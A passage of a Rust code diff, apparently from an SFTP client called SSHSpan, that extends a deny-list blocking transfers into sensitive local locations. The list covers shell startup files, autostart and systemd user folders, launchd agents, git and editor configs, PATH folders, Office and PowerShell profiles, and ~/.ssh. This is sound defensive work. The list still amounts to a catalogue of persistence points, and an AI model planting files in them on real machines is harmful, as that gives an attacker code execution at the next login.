@@ -45,18 +45,167 @@ enum LocalAccess {
     Basic,
 }
 
-/// Shell startup files in the home directory: anything planted there runs the
-/// next time a shell starts.
-const SHELL_RC_FILES: [&str; 8] = [
+/// Shell startup and logout files in the home folder: anything planted there
+/// runs the next time a shell starts or ends (bash, zsh, sh, ksh, csh/tcsh)
+/// or a graphical session begins (the X session scripts). `.inputrc` too: a
+/// readline key binding can type a whole command line into every bash.
+const SHELL_STARTUP_FILES: [&str; 24] = [
     ".bashrc",
     ".bash_profile",
     ".bash_login",
+    ".bash_logout",
+    ".bash_aliases",
     ".profile",
+    ".inputrc",
     ".zshrc",
     ".zprofile",
     ".zshenv",
     ".zlogin",
+    ".zlogout",
+    ".kshrc",
+    ".mkshrc",
+    ".cshrc",
+    ".tcshrc",
+    ".login",
+    ".logout",
+    ".xprofile",
+    ".xinitrc",
+    ".xserverrc",
+    ".xsession",
+    ".xsessionrc",
+    ".Xsession",
 ];
+
+/// Folders in the home folder that shells read startup code from.
+const HOME_SHELL_DIRS: [&str; 1] = [".profile.d"];
+
+/// Folders in the XDG config folder that shells read startup code from:
+/// fish, PowerShell (on Linux and macOS) and nushell.
+const CONFIG_SHELL_DIRS: [&str; 3] = ["fish", "powershell", "nushell"];
+
+/// Folders in the XDG config folder whose contents run at login: XDG
+/// autostart entries, KDE's login and logout scripts, systemd user units, and
+/// the environment systemd gives every user service.
+const CONFIG_STARTUP_DIRS: [&str; 6] = [
+    "autostart",
+    "autostart-scripts",
+    "plasma-workspace/env",
+    "plasma-workspace/shutdown",
+    "systemd/user",
+    "environment.d",
+];
+
+/// Files and folders in the home folder whose contents run when a program is
+/// next used: git's settings (core.sshCommand, hooks and fsmonitor run
+/// commands), the PAM environment (read at every login) and the editors'
+/// startup files - SSHSpan's own edit flow starts the system editor.
+const HOME_PROGRAM_FILES: [&str; 12] = [
+    ".gitconfig",
+    ".pam_environment",
+    ".vimrc",
+    ".gvimrc",
+    ".exrc",
+    ".vim",
+    "_vimrc",
+    "_gvimrc",
+    "vimfiles",
+    ".emacs",
+    ".emacs.el",
+    ".emacs.d",
+];
+
+/// The same for git, Neovim and Emacs in the XDG config folder.
+const CONFIG_PROGRAM_DIRS: [&str; 3] = ["git", "nvim", "emacs"];
+
+/// The user's own command folders, which are (or are typically) on the PATH:
+/// a program planted there runs in place of the one the user meant.
+const HOME_PATH_DIRS: [&str; 2] = [".local/bin", "bin"];
+
+/// The program locations of the home folder `home`: its command folders and
+/// every folder of the PATH (`path`) inside it - but not the home folder
+/// itself, which would refuse every download into it - git's settings, the
+/// PAM environment and the editors' startup files, also in the XDG config
+/// folders `config`. Pure so the layout can be unit-tested anywhere.
+fn home_program_locations(
+    home: &std::path::Path,
+    config: &[PathBuf],
+    path: &[PathBuf],
+) -> Vec<PathBuf> {
+    let on_path = path.iter().filter(|dir| {
+        dir.is_absolute()
+            && super::path_starts_with(dir, home)
+            && !super::path_starts_with(home, dir)
+    });
+    let locations = HOME_PATH_DIRS
+        .iter()
+        .map(|rel| join_parts(home, rel))
+        .chain(on_path.cloned())
+        .chain(HOME_PROGRAM_FILES.iter().map(|name| home.join(name)))
+        .chain(
+            config
+                .iter()
+                .flat_map(|c| CONFIG_PROGRAM_DIRS.iter().map(move |dir| c.join(dir))),
+        );
+    distinct(locations.map(Some))
+}
+
+/// The program locations on Windows: the WindowsApps folder (on the PATH),
+/// Office's startup folders and Normal template, Windows Terminal's settings
+/// (in each of its package folders, `terminal_packages`, and for the
+/// unpackaged install with its fragments) and Neovim's config folder.
+/// `appdata` and `local_appdata` are `%APPDATA%` and `%LOCALAPPDATA%`. Pure
+/// so the layout can be unit-tested anywhere.
+fn windows_program_locations(
+    appdata: Option<&std::path::Path>,
+    local_appdata: Option<&std::path::Path>,
+    terminal_packages: &[PathBuf],
+) -> Vec<PathBuf> {
+    let roaming = appdata.into_iter().flat_map(|base| {
+        [
+            "Microsoft/Word/STARTUP",
+            "Microsoft/Excel/XLSTART",
+            "Microsoft/Templates/Normal.dotm",
+        ]
+        .map(|rel| join_parts(base, rel))
+    });
+    let local = local_appdata.into_iter().flat_map(|base| {
+        [
+            "Microsoft/WindowsApps",
+            "Microsoft/Windows Terminal/settings.json",
+            "Microsoft/Windows Terminal/Fragments",
+            "nvim",
+        ]
+        .map(|rel| join_parts(base, rel))
+    });
+    let terminal = terminal_packages
+        .iter()
+        .map(|package| join_parts(package, "LocalState/settings.json"));
+    roaming.chain(local).chain(terminal).collect()
+}
+
+/// Windows Terminal's package folders in `packages` (`%LOCALAPPDATA%\Packages`):
+/// the stable, preview and canary installs.
+fn windows_terminal_packages(packages: &std::path::Path) -> Vec<PathBuf> {
+    std::fs::read_dir(packages)
+        .into_iter()
+        .flatten()
+        .flatten()
+        .filter(|entry| {
+            entry
+                .file_name()
+                .to_string_lossy()
+                .to_ascii_lowercase()
+                .starts_with("microsoft.windowsterminal")
+        })
+        .map(|entry| entry.path())
+        .collect()
+}
+
+/// `base` joined with a `/`-separated relative path, one component at a time.
+fn join_parts(base: &std::path::Path, rel: &str) -> PathBuf {
+    rel.split('/')
+        .fold(base.to_path_buf(), |dir, part| dir.join(part))
+}
 
 /// The per-user (`appdata`) and all-users (`program_data`) Windows Startup
 /// folders. Pure so the Windows layout can be unit-tested anywhere.
@@ -67,20 +216,77 @@ fn windows_startup_dirs(
     [appdata, program_data]
         .into_iter()
         .flatten()
-        .map(|base| {
-            ["Microsoft", "Windows", "Start Menu", "Programs", "Startup"]
-                .iter()
-                .fold(base.to_path_buf(), |dir, part| dir.join(part))
-        })
+        .map(|base| join_parts(base, "Microsoft/Windows/Start Menu/Programs/Startup"))
         .collect()
 }
 
-/// Local locations a (possibly compromised) renderer must not be able to aim a
-/// transfer or a local-pane mutation at. The renderer supplies these paths as
-/// plain strings; this is a deny-list, not a dialog-bound grant, and says so
-/// in its limits: anything outside it is still reachable (see the A6-02
-/// notes on `sftp_download`).
-struct SensitiveLocations {
+/// The PowerShell profile folders on Windows (`PowerShell` for PowerShell 7,
+/// `WindowsPowerShell` for 5.1): in the Documents folder where Windows says
+/// it is (OneDrive may have moved it) and in `~/Documents`. Pure so the
+/// layout can be unit-tested anywhere.
+fn powershell_profile_dirs(
+    documents: Option<&std::path::Path>,
+    home: Option<&std::path::Path>,
+) -> Vec<PathBuf> {
+    distinct([
+        documents.map(std::path::Path::to_path_buf),
+        home.map(|h| h.join("Documents")),
+    ])
+    .iter()
+    .flat_map(|root| ["PowerShell", "WindowsPowerShell"].map(|name| root.join(name)))
+    .collect()
+}
+
+/// The login and shell startup locations of the home folder `home`, with
+/// `config` and `data` the XDG config and data folders (`~/.config` and
+/// `~/.local/share`, plus wherever `XDG_CONFIG_HOME` / `XDG_DATA_HOME` move
+/// them). Returns (startup folders, shell startup files and folders). Pure so
+/// the layout can be unit-tested anywhere.
+fn home_startup_locations(
+    home: &std::path::Path,
+    config: &[PathBuf],
+    data: &[PathBuf],
+) -> (Vec<PathBuf>, Vec<PathBuf>) {
+    let startup = config
+        .iter()
+        .flat_map(|c| {
+            CONFIG_STARTUP_DIRS
+                .iter()
+                .map(move |rel| join_parts(c, rel))
+        })
+        .chain(data.iter().map(|d| join_parts(d, "systemd/user")))
+        .chain([join_parts(home, "Library/LaunchAgents")])
+        .collect();
+    let shell = SHELL_STARTUP_FILES
+        .iter()
+        .chain(HOME_SHELL_DIRS.iter())
+        .map(|name| home.join(name))
+        .chain(
+            config
+                .iter()
+                .flat_map(|c| CONFIG_SHELL_DIRS.iter().map(move |dir| c.join(dir))),
+        )
+        .collect();
+    (startup, shell)
+}
+
+/// The paths given, without the missing ones and without repeats.
+fn distinct(paths: impl IntoIterator<Item = Option<PathBuf>>) -> Vec<PathBuf> {
+    let mut out: Vec<PathBuf> = Vec::new();
+    for path in paths.into_iter().flatten() {
+        if !out.contains(&path) {
+            out.push(path);
+        }
+    }
+    out
+}
+
+/// The locations [`SensitiveLocations`] protects, as plain paths - before
+/// they are resolved.
+#[derive(Debug, Clone, Default)]
+struct Locations {
+    /// SSHSpan's data directory (the vault).
+    app_data_dir: Option<PathBuf>,
     /// SSHSpan's managed config directory. It is a SIBLING of the app data
     /// directory, so the app-data rule does not cover it, and it holds the
     /// managed ssh config whose arbitrary-write command was de-registered
@@ -88,48 +294,210 @@ struct SensitiveLocations {
     managed_config_dir: Option<PathBuf>,
     /// The user's `~/.ssh`: `config` (ProxyCommand), `authorized_keys`, keys.
     ssh_dir: Option<PathBuf>,
-    /// Windows Startup folders (empty elsewhere).
+    /// Folders whose contents run at login: the Windows Startup folders, XDG
+    /// autostart, systemd user units, launchd agents, ...
     startup_dirs: Vec<PathBuf>,
-    /// Shell startup files in the home directory.
-    shell_rc_files: Vec<PathBuf>,
+    /// Shell startup files, and the folders shells read startup code from
+    /// (fish, PowerShell, nushell, `~/.profile.d`).
+    shell_startup: Vec<PathBuf>,
+    /// What runs when a program is next used: the user's folders on the PATH,
+    /// git's settings, the editors' startup files, Office's startup folders,
+    /// Windows Terminal's settings, ...
+    program_files: Vec<PathBuf>,
+    /// The system folders (see [`super::system_dirs`]).
+    system_dirs: Vec<PathBuf>,
 }
 
-impl SensitiveLocations {
+impl Locations {
+    /// This machine's locations.
     fn current() -> Self {
         let home = dirs::home_dir();
-        let program_data = std::env::var_os("ProgramData").map(PathBuf::from);
-        Self {
-            managed_config_dir: ProjectDirs::from("org", "sshspan", "SSHSpan")
-                .map(|d| d.config_dir().to_path_buf()),
-            ssh_dir: home.as_ref().map(|h| h.join(".ssh")),
-            startup_dirs: if cfg!(windows) {
-                windows_startup_dirs(dirs::config_dir().as_deref(), program_data.as_deref())
-            } else {
-                Vec::new()
-            },
-            shell_rc_files: home
+        let project = ProjectDirs::from("org", "sshspan", "SSHSpan");
+        let env_dir = |var: &str| {
+            std::env::var_os(var)
+                .map(PathBuf::from)
+                .filter(|p| p.is_absolute())
+        };
+        let path: Vec<PathBuf> = std::env::var_os("PATH")
+            .map(|p| std::env::split_paths(&p).collect())
+            .unwrap_or_default();
+        let (mut startup_dirs, mut shell_startup, mut program_files) = match &home {
+            Some(home) => {
+                let config = distinct([Some(home.join(".config")), env_dir("XDG_CONFIG_HOME")]);
+                let data = distinct([
+                    Some(join_parts(home, ".local/share")),
+                    env_dir("XDG_DATA_HOME"),
+                ]);
+                let (startup, shell) = home_startup_locations(home, &config, &data);
+                (startup, shell, home_program_locations(home, &config, &path))
+            }
+            None => (Vec::new(), Vec::new(), Vec::new()),
+        };
+        if cfg!(windows) {
+            startup_dirs.extend(windows_startup_dirs(
+                dirs::config_dir().as_deref(),
+                env_dir("ProgramData").as_deref(),
+            ));
+            shell_startup.extend(powershell_profile_dirs(
+                dirs::document_dir().as_deref(),
+                home.as_deref(),
+            ));
+            let local = dirs::data_local_dir();
+            let terminal = local
                 .as_ref()
-                .map(|h| SHELL_RC_FILES.iter().map(|f| h.join(f)).collect())
-                .unwrap_or_default(),
+                .map(|l| windows_terminal_packages(&l.join("Packages")))
+                .unwrap_or_default();
+            program_files.extend(windows_program_locations(
+                dirs::config_dir().as_deref(),
+                local.as_deref(),
+                &terminal,
+            ));
+        }
+        Self {
+            app_data_dir: project.as_ref().map(|d| d.data_dir().to_path_buf()),
+            managed_config_dir: project.as_ref().map(|d| d.config_dir().to_path_buf()),
+            ssh_dir: home.as_ref().map(|h| h.join(".ssh")),
+            startup_dirs,
+            shell_startup,
+            program_files,
+            system_dirs: super::system_dirs(),
         }
     }
 
-    /// Why `path` is off-limits for `access`, if it is. `path` should already
-    /// be in its resolved form (see [`resolved_local_path`]); each root is
-    /// compared in its literal AND its canonical spelling, because `~/.ssh`
-    /// and the rc files are very commonly symlinks into a dotfiles checkout.
+    /// Resolve every location, once (see [`Protected`]).
+    fn resolve(self) -> SensitiveLocations {
+        let all = |paths: Vec<PathBuf>| -> Vec<Protected> {
+            paths.into_iter().map(Protected::new).collect()
+        };
+        SensitiveLocations {
+            app_data_dir: self.app_data_dir.map(Protected::new),
+            managed_config_dir: self.managed_config_dir.map(Protected::new),
+            ssh_dir: self.ssh_dir.map(Protected::new),
+            startup_dirs: all(self.startup_dirs),
+            shell_startup: all(self.shell_startup),
+            program_files: all(self.program_files),
+            system_dirs: all(self.system_dirs),
+        }
+    }
+}
+
+/// One protected location in each spelling a path can reach it by: as
+/// configured, and resolved through whatever part of it exists (`~/.ssh` is
+/// often a link into a dotfiles checkout; a Startup folder that does not
+/// exist yet still resolves through the folders above it). Resolved ONCE,
+/// when the [`SensitiveLocations`] are built: a check after that is a
+/// comparison, without touching the disk. (Every location used to be
+/// resolved again for every file of a folder transfer - about 50 resolutions
+/// per file: 4 s for 10,000 files on Linux, about 90 s on Windows, before
+/// anything was queued.)
+#[derive(Debug, Clone)]
+struct Protected {
+    spellings: Vec<PathBuf>,
+}
+
+impl Protected {
+    fn new(location: PathBuf) -> Self {
+        let resolved = resolved_local_path(&location);
+        let mut spellings = vec![location];
+        if resolved != spellings[0] {
+            spellings.push(resolved);
+        }
+        Self { spellings }
+    }
+
+    /// `path` is this location or inside it.
+    fn covers(&self, path: &std::path::Path) -> bool {
+        self.spellings
+            .iter()
+            .any(|s| super::path_starts_with(path, s))
+    }
+
+    /// This location is `path` or inside it: deleting or moving `path` takes
+    /// the location along.
+    fn is_within(&self, path: &std::path::Path) -> bool {
+        self.spellings
+            .iter()
+            .any(|s| super::path_starts_with(s, path))
+    }
+}
+
+const VAULT_REFUSAL: &str = "The application data directory is off-limits for SFTP transfers.";
+const SYSTEM_REFUSAL: &str = "System directories are off-limits for SFTP transfers.";
+const MANAGED_CONFIG_REFUSAL: &str =
+    "SSHSpan's own configuration folder is off-limits for SFTP transfers.";
+
+/// How long [`SensitiveLocations::current`] reuses one resolution of the
+/// locations: short, so a `~/.ssh` re-linked elsewhere is recognised within
+/// seconds; long enough that a queue starting thousands of downloads
+/// resolves them a handful of times, not once per job (+9 ms per job on
+/// Windows).
+const SENSITIVE_REUSE: std::time::Duration = std::time::Duration::from_secs(5);
+
+/// Local locations a (possibly compromised) renderer must not be able to aim a
+/// transfer or a local-pane mutation at, resolved (see [`Protected`]). The
+/// renderer supplies these paths as plain strings; this is a deny-list, not a
+/// dialog-bound grant, and says so in its limits: anything outside it is
+/// still reachable (see the A6-02 notes on `sftp_download`).
+struct SensitiveLocations {
+    /// SSHSpan's data directory (the vault): refused for every access (the
+    /// base rules), and listed so that deleting or moving a folder that
+    /// CONTAINS it is refused too.
+    app_data_dir: Option<Protected>,
+    managed_config_dir: Option<Protected>,
+    ssh_dir: Option<Protected>,
+    startup_dirs: Vec<Protected>,
+    shell_startup: Vec<Protected>,
+    program_files: Vec<Protected>,
+    /// Refused for every access (the base rules).
+    system_dirs: Vec<Protected>,
+}
+
+impl SensitiveLocations {
+    /// This machine's locations, resolved - reused for [`SENSITIVE_REUSE`].
+    fn current() -> Arc<Self> {
+        type Cached = Option<(std::time::Instant, Arc<SensitiveLocations>)>;
+        static LAST: std::sync::Mutex<Cached> = std::sync::Mutex::new(None);
+        let mut last = LAST
+            .lock()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        if let Some((at, locations)) = last.as_ref() {
+            if at.elapsed() < SENSITIVE_REUSE {
+                return Arc::clone(locations);
+            }
+        }
+        let fresh = Arc::new(Locations::current().resolve());
+        *last = Some((std::time::Instant::now(), Arc::clone(&fresh)));
+        fresh
+    }
+
+    /// The rules for every access, a dialog-approved path included: nothing
+    /// in SSHSpan's data folder (the vault), nothing in a system folder.
+    fn base_refusal(&self, path: &std::path::Path) -> Option<&'static str> {
+        if self.app_data_dir.as_ref().is_some_and(|d| d.covers(path)) {
+            return Some(VAULT_REFUSAL);
+        }
+        self.system_dirs
+            .iter()
+            .any(|d| d.covers(path))
+            .then_some(SYSTEM_REFUSAL)
+    }
+
+    /// Why `path` is off-limits for `access` by the deny-list, if it is. A
+    /// comparison only: pass the path in its literal AND its resolved
+    /// spelling (see [`Self::path_refusal`]).
     fn refusal(&self, path: &std::path::Path, access: LocalAccess) -> Option<&'static str> {
         if access == LocalAccess::Basic {
             return None;
         }
-        let inside = |root: &std::path::Path| -> bool {
-            super::path_starts_with(path, root)
-                || dunce::canonicalize(root).is_ok_and(|real| super::path_starts_with(path, &real))
-        };
-        if self.managed_config_dir.as_deref().is_some_and(&inside) {
-            return Some("SSHSpan's own configuration folder is off-limits for SFTP transfers.");
+        let covered =
+            |location: &Option<Protected>| location.as_ref().is_some_and(|l| l.covers(path));
+        if covered(&self.app_data_dir) {
+            return Some(VAULT_REFUSAL);
         }
-        if self.ssh_dir.as_deref().is_some_and(&inside) {
+        if covered(&self.managed_config_dir) {
+            return Some(MANAGED_CONFIG_REFUSAL);
+        }
+        if covered(&self.ssh_dir) {
             // Public keys are not secret, and putting one on a server is an
             // everyday SSH task - so reading them is fine. Nothing is ever
             // WRITTEN into ~/.ssh by a renderer-chosen path.
@@ -147,45 +515,140 @@ impl SensitiveLocations {
                 );
             }
         }
-        // Planting a startup entry or editing a shell rc file is code
+        // Planting a startup entry or editing a shell startup file is code
         // execution at the next login - but reading one (dotfile syncing) is
         // ordinary, so these only apply to writes.
         if access == LocalAccess::Write {
-            if self.startup_dirs.iter().any(|d| inside(d)) {
+            if self.startup_dirs.iter().any(|d| d.covers(path)) {
                 return Some(
-                    "Startup folders are off-limits for SFTP downloads and local changes.",
+                    "Startup folders (what is in them runs at login) are off-limits for SFTP downloads and local changes.",
                 );
             }
-            if self.shell_rc_files.iter().any(|f| inside(f)) {
+            if self.shell_startup.iter().any(|f| f.covers(path)) {
                 return Some(
-                    "Shell startup files (.bashrc, .profile, ...) are off-limits for SFTP downloads and local changes.",
+                    "Shell startup files and folders (.bashrc, .profile, fish and PowerShell profiles, ...) are off-limits for SFTP downloads and local changes.",
+                );
+            }
+            if self.program_files.iter().any(|f| f.covers(path)) {
+                return Some(
+                    "Your folders on the PATH and settings that run commands (git, vim, emacs, Office, Windows Terminal, ...) are off-limits for SFTP downloads and local changes.",
                 );
             }
         }
         None
     }
+
+    /// Why a path - in its literal and its resolved spelling - is off-limits
+    /// for `access`: the base rules first, then the deny-list.
+    fn path_refusal(
+        &self,
+        literal: &std::path::Path,
+        resolved: &std::path::Path,
+        access: LocalAccess,
+    ) -> Option<&'static str> {
+        let spellings = [resolved, literal];
+        spellings
+            .iter()
+            .find_map(|p| self.base_refusal(p))
+            .or_else(|| spellings.iter().find_map(|p| self.refusal(p, access)))
+    }
+
+    /// Why nothing in the folder (literal and resolved spelling) may be
+    /// uploaded: the base rules and SSHSpan's configuration folder refuse
+    /// every file in it. (`~/.ssh` does not: its public keys may be uploaded,
+    /// so its files are judged one by one.)
+    fn folder_read_refusal(
+        &self,
+        literal: &std::path::Path,
+        resolved: &std::path::Path,
+    ) -> Option<&'static str> {
+        let spellings = [resolved, literal];
+        spellings
+            .iter()
+            .find_map(|p| self.base_refusal(p))
+            .or_else(|| {
+                spellings
+                    .iter()
+                    .any(|p| {
+                        self.managed_config_dir
+                            .as_ref()
+                            .is_some_and(|d| d.covers(p))
+                    })
+                    .then_some(MANAGED_CONFIG_REFUSAL)
+            })
+    }
+
+    /// Which protected location `path` HOLDS (is that location, or a folder
+    /// above it), if any: deleting or moving such a folder deletes or moves
+    /// the protected location with it - the home folder takes `~/.ssh`, the
+    /// shell rc files and SSHSpan's data along. Both spellings of `path`
+    /// (literal and resolved) are compared with both spellings of each
+    /// location (a `~/.ssh` that is a link into a dotfiles checkout makes
+    /// the checkout hold the keys).
+    fn held_by(&self, path: &std::path::Path) -> Option<&'static str> {
+        let resolved = resolved_local_path(path);
+        let holds =
+            |location: &Protected| location.is_within(path) || location.is_within(&resolved);
+        let single: [(&Option<Protected>, &'static str); 3] = [
+            (&self.ssh_dir, "your ~/.ssh folder"),
+            (&self.managed_config_dir, "SSHSpan's configuration folder"),
+            (&self.app_data_dir, "SSHSpan's data folder (the vault)"),
+        ];
+        if let Some((_, what)) = single
+            .iter()
+            .find(|(location, _)| location.as_ref().is_some_and(holds))
+        {
+            return Some(what);
+        }
+        if self.startup_dirs.iter().any(holds) {
+            return Some("a startup folder (what is in it runs at login)");
+        }
+        if self.shell_startup.iter().any(holds) {
+            return Some("a shell startup file (.bashrc, .profile, ...)");
+        }
+        if self.program_files.iter().any(holds) {
+            return Some("a folder on your PATH or a settings file that runs commands");
+        }
+        None
+    }
+}
+
+/// `dunce::canonicalize` - the one way the local-path rules resolve a path, so
+/// the tests can count how often that happens (each is several syscalls, and
+/// a per-FILE resolution made big folder transfers crawl).
+fn canonical(p: &std::path::Path) -> std::io::Result<PathBuf> {
+    #[cfg(test)]
+    tests::count_resolution();
+    dunce::canonicalize(p)
 }
 
 /// `path` with symlinks resolved as far as the filesystem allows: the whole
-/// path when it exists, otherwise its parent (a not-yet-existing target such
-/// as a download destination has to resolve through its parent) joined with
-/// the file name. dunce::canonicalize (not std::fs::canonicalize): on Windows std
-/// returns a `\\?\`-prefixed path, and `Path::starts_with` compares prefix
-/// components exactly, so a verbatim path NEVER matched the plain
-/// `C:\Users\...` app-data dir - the guard fired only for paths that did not
-/// exist yet, i.e. it was inverted exactly where a write could succeed. dunce
-/// keeps existing paths in the plain form so both shapes compare.
+/// path when it exists, otherwise its deepest existing ancestor, resolved,
+/// with the rest joined on - a not-yet-existing target (a download, a folder
+/// the queue will create) resolves through whatever above it exists, so a
+/// link to `~/.ssh` cannot hide behind levels that do not exist yet. (Only the
+/// parent used to be tried.) dunce::canonicalize (not std::fs::canonicalize):
+/// on Windows std returns a `\\?\`-prefixed path, and `Path::starts_with`
+/// compares prefix components exactly, so a verbatim path NEVER matched the
+/// plain `C:\Users\...` app-data dir - the guard fired only for paths that did
+/// not exist yet, i.e. it was inverted exactly where a write could succeed.
+/// dunce keeps existing paths in the plain form so both shapes compare (and
+/// for a path dunce keeps verbatim - one longer than 260 characters -
+/// [`super::path_starts_with`] compares the prefix by its plain form).
 fn resolved_local_path(p: &std::path::Path) -> PathBuf {
-    if let Ok(real) = dunce::canonicalize(p) {
-        return real;
-    }
-    match (
-        p.parent()
-            .and_then(|parent| dunce::canonicalize(parent).ok()),
-        p.file_name(),
-    ) {
-        (Some(parent), Some(name)) => parent.join(name),
-        _ => p.to_path_buf(),
+    let mut existing = p;
+    let mut rest: Vec<&std::ffi::OsStr> = Vec::new();
+    loop {
+        if let Ok(real) = canonical(existing) {
+            return rest.iter().rev().fold(real, |path, part| path.join(part));
+        }
+        match (existing.parent(), existing.file_name()) {
+            (Some(parent), Some(name)) => {
+                rest.push(name);
+                existing = parent;
+            }
+            _ => return p.to_path_buf(),
+        }
     }
 }
 
@@ -194,12 +657,13 @@ fn resolved_local_path(p: &std::path::Path) -> PathBuf {
 /// sensitive locations in [`SensitiveLocations`]. Runs for BOTH directions: a
 /// download must not write there, and an upload must not read the vault (or
 /// other app-private files) out to a server. The app data rule mirrors
-/// `validate_export_path`; the system-dir rule reuses the same denylist, so
-/// a (hypothetically compromised) renderer cannot aim SFTP transfers at
+/// `validate_export_path`; the system-dir rule uses the same list, so a
+/// (hypothetically compromised) renderer cannot aim SFTP transfers at
 /// `C:\Windows`, `/etc`, or friends either.
 ///
-/// Both the target itself and its parent are probed: the parent may not exist
-/// yet (the queue path creates it later) and the target may already exist.
+/// The target is judged in its literal spelling and resolved through the
+/// deepest part of it that exists: the parent may not exist yet (the queue
+/// path creates it later) and the target may already exist.
 fn validate_sftp_local_path(path: &str, access: LocalAccess) -> CmdResult<()> {
     validate_sftp_local_path_with(path, access, &SensitiveLocations::current())
 }
@@ -209,79 +673,191 @@ fn validate_sftp_local_path_with(
     access: LocalAccess,
     sensitive: &SensitiveLocations,
 ) -> CmdResult<()> {
-    let p = std::path::Path::new(path);
+    match local_path_refusal(std::path::Path::new(path), access, sensitive) {
+        Some(why) => Err(CmdError(why)),
+        None => Ok(()),
+    }
+}
+
+/// Why `p` is refused for `access`, if it is - the rule
+/// [`validate_sftp_local_path`] applies.
+fn local_path_refusal(
+    p: &std::path::Path,
+    access: LocalAccess,
+    sensitive: &SensitiveLocations,
+) -> Option<String> {
+    if let Some(why) = local_path_shape_refusal(p) {
+        return Some(why.to_string());
+    }
+    // Every rule is judged on the RESOLVED path (through the deepest part
+    // that exists) and on the literal one, so neither a symlinked folder
+    // nor a not-yet-existing target slips past.
+    let resolved = resolved_local_path(p);
+    sensitive
+        .path_refusal(p, &resolved, access)
+        .map(str::to_string)
+}
+
+/// A renderer-supplied local path must be absolute and free of `..`.
+fn local_path_shape_refusal(p: &std::path::Path) -> Option<&'static str> {
     if !p.is_absolute() {
-        return Err("Local path must be absolute.".into());
+        return Some("Local path must be absolute.");
     }
-
-    let check = |probe: &std::path::Path| -> CmdResult<()> {
-        let normalized = dunce::canonicalize(probe).unwrap_or_else(|_| probe.to_path_buf());
-        if let Some(app_data) = ProjectDirs::from("org", "sshspan", "SSHSpan") {
-            let app_data_dir = app_data.data_dir();
-            let app_data_norm =
-                dunce::canonicalize(app_data_dir).unwrap_or_else(|_| app_data_dir.to_path_buf());
-            if super::path_starts_with(&normalized, &app_data_norm)
-                || super::path_starts_with(&normalized, app_data_dir)
-            {
-                return Err(
-                    "The application data directory is off-limits for SFTP transfers.".into(),
-                );
-            }
-        }
-        if super::is_system_path(&normalized) {
-            return Err("System directories are off-limits for SFTP transfers.".into());
-        }
-        Ok(())
-    };
-
-    if let Some(parent) = p.parent() {
-        check(parent)?;
+    // `..` is resolved before the disk is consulted (Windows always, and
+    // `create_dir_all` walks through it), so `<home>/x/../.ssh` reached
+    // `~/.ssh` while neither spelling matched the deny-list.
+    if p.components()
+        .any(|c| matches!(c, std::path::Component::ParentDir))
+    {
+        return Some("Local paths must not contain \"..\" - use the folder's full path instead.");
     }
-    check(p)?;
-    // The sensitive locations are judged on the RESOLVED path and on the
-    // literal one, so neither a symlinked parent nor a not-yet-existing
-    // target slips past.
-    for candidate in [resolved_local_path(p), p.to_path_buf()] {
-        if let Some(why) = sensitive.refusal(&candidate, access) {
-            return Err(why.into());
-        }
-    }
-    Ok(())
+    None
 }
 
-/// Non-erroring form of the app-data/system rule for DESCENDANT filtering
-/// (F5): `validate_sftp_local_path` gates the user-selected ROOT of an
-/// upload, but a recursive walk enqueues descendants without re-checking, so
-/// an allowed ancestor that CONTAINS app data (or a symlink to a protected
-/// file) would upload the vault database - or, with the home directory as the
-/// root, everything under `~/.ssh` but the public keys. This predicate answers "is this
-/// exact path, or the canonical target it resolves to, protected?" so the
-/// recursive expander can skip (not fail) protected entries. Symlinked files
-/// are checked against their canonical target, closing the symlink-to-vault
-/// gap.
+/// Non-erroring form of the read rule for DESCENDANT filtering (F5) and for
+/// a link an upload follows: `validate_sftp_local_path` gates the
+/// user-selected ROOT of an upload, but a recursive walk enqueues descendants
+/// without re-checking, so an allowed ancestor that CONTAINS app data (or a
+/// symlink to a protected file) would upload the vault database - or, with
+/// the home directory as the root, everything under `~/.ssh` but the public
+/// keys. This predicate answers "is this exact path, or the canonical target
+/// it resolves to, protected?" Symlinked files are checked against their
+/// canonical target, closing the symlink-to-vault gap.
 fn is_protected_upload_source(path: &std::path::Path) -> bool {
-    is_protected_upload_source_with(path, &SensitiveLocations::current())
+    protected_upload_source(path, &SensitiveLocations::current()).is_some()
 }
 
-fn is_protected_upload_source_with(path: &std::path::Path, sensitive: &SensitiveLocations) -> bool {
+/// Why `path` (and the target it resolves to) may not be uploaded, if so.
+fn protected_upload_source(
+    path: &std::path::Path,
+    sensitive: &SensitiveLocations,
+) -> Option<&'static str> {
     // Canonicalize resolves the final symlink component too, so a symlink to
     // the vault DB is recognized by its target.
-    let normalized = dunce::canonicalize(path).unwrap_or_else(|_| path.to_path_buf());
-    if let Some(app_data) = ProjectDirs::from("org", "sshspan", "SSHSpan") {
-        let app_data_dir = app_data.data_dir();
-        let app_data_norm =
-            dunce::canonicalize(app_data_dir).unwrap_or_else(|_| app_data_dir.to_path_buf());
-        if super::path_starts_with(&normalized, &app_data_norm)
-            || super::path_starts_with(&normalized, app_data_dir)
-        {
-            return true;
-        }
+    let normalized = canonical(path).unwrap_or_else(|_| path.to_path_buf());
+    sensitive.path_refusal(path, &normalized, LocalAccess::Read)
+}
+
+#[cfg(test)]
+fn is_protected_upload_source_with(path: &std::path::Path, sensitive: &SensitiveLocations) -> bool {
+    protected_upload_source(path, sensitive).is_some()
+}
+
+/// Why a local path built from REMOTE names - a file or folder of a folder
+/// download, an edit session's staged copy - must not be written, if it must
+/// not (A6-02). Only the destination folder used to be checked, so a remote
+/// folder holding `.bashrc` or `.ssh/authorized_keys`, downloaded into the
+/// home folder, wrote exactly those. The path must be a plain chain of usable
+/// names below `root` - no `..`, root, drive or share, no NUL or other
+/// control character, no Windows device name, nothing Windows would rename
+/// on disk - and the final path passes the write deny-list.
+fn derived_local_refusal(
+    root: &std::path::Path,
+    path: &std::path::Path,
+    sensitive: &SensitiveLocations,
+) -> Option<String> {
+    derived_local_refusal_under(&resolved_local_path(root), root, path, sensitive)
+}
+
+/// [`derived_local_refusal`] with `root`'s resolved spelling already known
+/// (a folder download resolves its destination once).
+fn derived_local_refusal_under(
+    root_resolved: &std::path::Path,
+    root: &std::path::Path,
+    path: &std::path::Path,
+    sensitive: &SensitiveLocations,
+) -> Option<String> {
+    let plain = path.strip_prefix(root).is_ok_and(|rel| {
+        rel.components().all(|c| match c {
+            std::path::Component::Normal(name) => name.to_str().is_some_and(is_plain_local_name),
+            _ => false,
+        })
+    });
+    if !plain {
+        return Some(
+            "its local path would not be a plain file name inside the destination folder"
+                .to_string(),
+        );
     }
-    super::is_system_path(&normalized)
-        || sensitive
-            .refusal(&normalized, LocalAccess::Read)
-            .or_else(|| sensitive.refusal(path, LocalAccess::Read))
-            .is_some()
